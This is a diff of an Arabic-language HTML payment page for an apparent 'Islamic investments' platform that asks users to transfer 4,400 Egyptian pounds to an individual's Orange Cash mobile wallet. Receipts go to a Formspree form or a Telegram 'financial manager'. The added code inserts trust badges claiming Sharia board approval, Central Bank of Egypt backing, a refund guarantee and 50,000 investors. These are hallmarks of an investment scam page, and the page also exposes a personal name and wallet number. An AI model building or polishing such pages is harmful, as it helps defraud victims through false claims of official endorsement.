@@ -17,7 +17,7 @@
       background-color: #f4f5f8;
       display: flex;
       justify-content: center;
-      padding: 20px;
+      padding: 0 0 20px 0;
       color: #333;
     }
 
@@ -25,6 +25,126 @@
       width: 100%;
       max-width: 420px;
       background: #f4f5f8;
+    }
+
+    /* الهيدر الأخضر العلوي */
+    .header-card {
+      background-color: #0b3c26;
+      color: #ffffff;
+      padding: 20px 16px;
+      border-bottom-left-radius: 20px;
+      border-bottom-right-radius: 20px;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .header-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 15px;
+    }
+
+    .header-title-box {
+      text-align: right;
+    }
+
+    .header-title {
+      font-size: 1.1rem;
+      font-weight: 700;
+      line-height: 1.2;
+    }
+
+    .header-subtitle {
+      font-size: 0.75rem;
+      color: #a8c3b3;
+    }
+
+    .header-icons {
+      display: flex;
+      gap: 10px;
+      font-size: 1.1rem;
+    }
+
+    .amount-label {
+      font-size: 0.85rem;
+      color: #a8c3b3;
+      margin-top: 10px;
+    }
+
+    .amount-value {
+      font-size: 2.3rem;
+      font-weight: 700;
+      color: #d4af37;
+      line-height: 1.1;
+      margin: 5px 0;
+    }
+
+    .amount-currency {
+      font-size: 0.85rem;
+      color: #a8c3b3;
+      margin-bottom: 15px;
+    }
+
+    .manager-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(255, 255, 255, 0.1);
+      padding: 6px 14px;
+      border-radius: 30px;
+      font-size: 0.85rem;
+      border: 1px solid rgba(255, 255, 255, 0.15);
+    }
+
+    .manager-avatar {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background-color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.75rem;
+    }
+
+    /* محتوى الصفحة الرئيسي */
+    .content-padding {
+      padding: 0 16px;
+    }
+
+    .trust-badges {
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    .badges-row {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 15px;
+      flex-wrap: wrap;
+      margin-bottom: 8px;
+    }
+
+    .badge-item {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 0.8rem;
+      color: #7d828a;
+      font-weight: 600;
+    }
+
+    .badge-icon {
+      font-size: 0.9rem;
+    }
+
+    .trust-subtitle {
+      font-size: 0.75rem;
+      color: #a0a5ac;
+      font-weight: 600;
+      margin-top: 8px;
     }
 
     .alert-box {
@@ -174,70 +294,110 @@
 
 <div class="container">
 
-  <div class="alert-box">
-    <div class="alert-title">
-      ⚠️ تحقق من البيانات قبل الدفع
+  <!-- الهيدر الأخضر الجديد -->
+  <div class="header-card">
+    <div class="header-top">
+      <div class="header-icons">
+        <span>🔒</span>
+      </div>
+      <div class="header-title-box">
+        <div class="header-title">الاستثمارات الإسلامية 🌙</div>
+        <div class="header-subtitle">منصة استثمار متوافقة مع الشريعة</div>
+      </div>
     </div>
-    يجب دائماً التحقق من هذه البيانات مباشرة قبل تنفيذ التحويل. قد تتغير البيانات في أي وقت، لذلك لا تعتمد على لقطة شاشة أو بيانات قديمة.
+
+    <div class="amount-label">المبلغ المطلوب</div>
+    <div class="amount-value">4,400.00</div>
+    <div class="amount-currency">جنيه مصري</div>
+
+    <div class="manager-pill">
+      <span class="manager-avatar">👤</span>
+      <span>مديرك المالي: <strong>عهد فرج</strong></span>
+      <span>✔️</span>
+    </div>
   </div>
 
-  <div class="section-title">بيانات الدفع الحالية</div>
+  <div class="content-padding">
 
-  <div class="details-card">
-    
-    <div class="info-row">
-      <button class="copy-btn" onclick="copyText('ORANGE CASH')">📋</button>
-      <div class="info-content">
-        <span class="info-label">🏦 بنك</span>
-        <span class="info-value">ORANGE CASH</span>
+    <!-- قسم الاعتمادات والشارات -->
+    <div class="trust-badges">
+      <div class="badges-row">
+        <span class="badge-item"><span class="badge-icon">🌙</span> معتمد من هيئة الرقابة الشرعية</span>
+        <span class="badge-item"><span class="badge-icon">↩️</span> ضمان استرداد الأموال</span>
       </div>
+      <div class="badges-row">
+        <span class="badge-item"><span class="badge-icon">🏛️</span> البنك المركزي المصري</span>
+        <span class="badge-item"><span class="badge-icon">✔️</span> +50,000 مستثمر</span>
+      </div>
+      <div class="trust-subtitle">الاستثمارات الإسلامية</div>
     </div>
 
-    <div class="info-row">
-      <button class="copy-btn" onclick="copyText('ALI AHMED GAMAL')">📋</button>
-      <div class="info-content">
-        <span class="info-label">👤 اسم المستلم</span>
-        <span class="info-value">ALI AHMED GAMAL</span>
+    <div class="alert-box">
+      <div class="alert-title">
+        ⚠️ تحقق من البيانات قبل الدفع
       </div>
+      يجب دائماً التحقق من هذه البيانات مباشرة قبل تنفيذ التحويل. قد تتغير البيانات في أي وقت، لذلك لا تعتمد على لقطة شاشة أو بيانات قديمة.
     </div>
 
-    <div class="info-row">
-      <button class="copy-btn" onclick="copyText('01203174947')">📋</button>
-      <div class="info-content">
-        <span class="info-label">💳 رقم المحفظه</span>
-        <span class="info-value">01203174947</span>
+    <div class="section-title">بيانات الدفع الحالية</div>
+
+    <div class="details-card">
+      
+      <div class="info-row">
+        <button class="copy-btn" onclick="copyText('ORANGE CASH')">📋</button>
+        <div class="info-content">
+          <span class="info-label">🏦 بنك</span>
+          <span class="info-value">ORANGE CASH</span>
+        </div>
       </div>
+
+      <div class="info-row">
+        <button class="copy-btn" onclick="copyText('ALI AHMED GAMAL')">📋</button>
+        <div class="info-content">
+          <span class="info-label">👤 اسم المستلم</span>
+          <span class="info-value">ALI AHMED GAMAL</span>
+        </div>
+      </div>
+
+      <div class="info-row">
+        <button class="copy-btn" onclick="copyText('01203174947')">📋</button>
+        <div class="info-content">
+          <span class="info-label">💳 رقم المحفظه</span>
+          <span class="info-value">01203174947</span>
+        </div>
+      </div>
+
+      <div class="info-row">
+        <button class="copy-btn" onclick="copyText('يرجى التحويل باستخدام رقم المحفظه فقط، وليس عبر IBAN.')">📋</button>
+        <div class="info-note">
+          يرجى التحويل باستخدام رقم المحفظه فقط، وليس عبر IBAN. ⚠️
+        </div>
+      </div>
+
+      <div class="info-row">
+        <button class="copy-btn" onclick="copyText('لا يتم قبول الإيصالات التي لا يظهر فيها تاريخ ووقت الدفع.')">📋</button>
+        <div class="info-note">
+          لا يتم قبول الإيصالات التي لا يظهر فيها تاريخ ووقت الدفع. ⚠️
+        </div>
+      </div>
+
     </div>
 
-    <div class="info-row">
-      <button class="copy-btn" onclick="copyText('يرجى التحويل باستخدام رقم المحفظه فقط، وليس عبر IBAN.')">📋</button>
-      <div class="info-note">
-        يرجى التحويل باستخدام رقم المحفظه فقط، وليس عبر IBAN. ⚠️
-      </div>
+    <div class="success-banner" id="successBanner">
+      ✓ تم تحميل الإيصال بنجاح! تم إخطار مديرك.
     </div>
 
-    <div class="info-row">
-      <button class="copy-btn" onclick="copyText('لا يتم قبول الإيصالات التي لا يظهر فيها تاريخ ووقت الدفع.')">📋</button>
-      <div class="info-note">
-        لا يتم قبول الإيصالات التي لا يظهر فيها تاريخ ووقت الدفع. ⚠️
-      </div>
+    <form id="uploadForm" action="https://formspree.io/f/mwlelbrp" method="POST" enctype="multipart/form-data">
+      <input type="file" id="fileInput" name="receipt" accept="image/*" onchange="submitForm()">
+      <label for="fileInput" class="upload-label" id="uploadLabel">
+        📥 إرسال المستند
+      </label>
+    </form>
+
+    <div class="footer-text">
+      إذا لم تتمكن من رفع إيصال الدفع هنا، فأرسله إلى مديرك: <a href="https://t.me/capitan_ahed" target="_blank">@capitan_ahed</a>
     </div>
 
-  </div>
-
-  <div class="success-banner" id="successBanner">
-    ✓ تم تحميل الإيصال بنجاح! قم بإخطار عهد.
-  </div>
-
-  <form id="uploadForm" action="https://formspree.io/f/mwlelbrp" method="POST" enctype="multipart/form-data">
-    <input type="file" id="fileInput" name="receipt" accept="image/*" onchange="submitForm()">
-    <label for="fileInput" class="upload-label" id="uploadLabel">
-      📥 إرسال المستند
-    </label>
-  </form>
-
-  <div class="footer-text">
-    إذا لم تتمكن من رفع إيصال الدفع هنا، فأرسله إلى مديرك: <a href="https://t.me/capitan_ahed" target="_blank">@capitan_ahed</a>
   </div>
 
 </div>
